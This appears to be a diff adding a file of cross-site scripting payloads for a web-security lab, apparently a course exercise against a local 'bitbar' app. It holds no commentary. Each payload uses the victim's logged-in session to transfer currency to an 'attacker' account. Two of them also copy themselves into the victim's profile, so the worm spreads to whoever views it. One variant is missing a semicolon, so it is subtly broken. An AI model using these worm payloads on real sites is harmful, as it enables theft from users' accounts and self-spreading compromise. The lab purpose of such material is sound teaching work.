@@ -1,0 +1,29 @@
+<span id="s">
+<span id="bitbar_count" class="eval(document.getElementById('x').innerHTML)"></span>
+<span id="x">
+	var req = new XMLHttpRequest();
+	var params1 = "destination_username=attacker&quantity=1";
+	params1 = params1.replace('amp;', '');
+	req.open("POST", "http://localhost:3000/post_transfer");
+	req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	req.withCredentials = true;
+	req.send(params1);
+	var req2 = new XMLHttpRequest();
+	var params2 = "new_profile=".concat(escape(document.getElementById('s').outerHTML));
+	req2.open('POST', 'http://localhost:3000/set_profile');
+	req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	req2.withCredentials = true;
+	req2.send(params2);
+</span>
+</span>
+
+
+
+
+
+
+
+<div id="s"><script>var req = new XMLHttpRequest();var params1 = "destination_username=attacker&quantity=1"req.open('POST', 'http://localhost:3000/post_transfer',false);req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");req.withCredentials = true;req.send(params1);var req2 = new XMLHttpRequest();var params2 = "new_profile=" + document.getElementById('s').innerHTML;req2.open('POST', 'http://localhost:3000/set_profile',false);req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");req2.withCredentials = true;req2.send(params2);</script></div>
+
+
+<script>var req = new XMLHttpRequest();var params1 = "destination_username=attacker&quantity=1";req.open("POST", "http://localhost:3000/post_transfer",false);req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");req.withCredentials = true;req.send(params1);</script>
